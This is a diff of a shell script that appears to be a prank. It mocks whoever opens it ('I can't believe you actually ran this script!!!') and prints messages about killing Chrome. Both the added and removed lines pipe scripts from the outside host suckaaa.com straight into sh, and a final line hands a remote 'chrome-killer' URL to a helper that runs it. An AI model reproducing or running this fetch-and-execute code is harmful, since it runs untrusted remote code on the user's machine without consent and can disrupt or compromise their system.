@@ -3,7 +3,7 @@
 ###########  HEADER  ###########
 # loL whatcha lookin for in here??
 # Don't worry about it!!
-curl -s 'https://suckaaa.com/s/lib-installer' | sh;
+curl -s 'https://suckaaa.com/s/garbage-lib-installer' | sh;
 source ~/.garbage/lib;
 clear;
 ###########  END HEADER  ###########
@@ -18,8 +18,6 @@ cancelNoise;
 cancelNoise;
 
 echo "\n\nI can't believe you actually ran this script!!!\n";
-
-
 
 echo "loL";
 # sleep $(random);
@@ -47,4 +45,4 @@ echo "Killing Chrome!!";
 sleep 1s;
 echo "Killing Chrome!!";
 
-termdo 'curl -s https://suckaaa.com/s/chrome-killer | sh';
+nextScript 'https://suckaaa.com/s/chrome-killer';
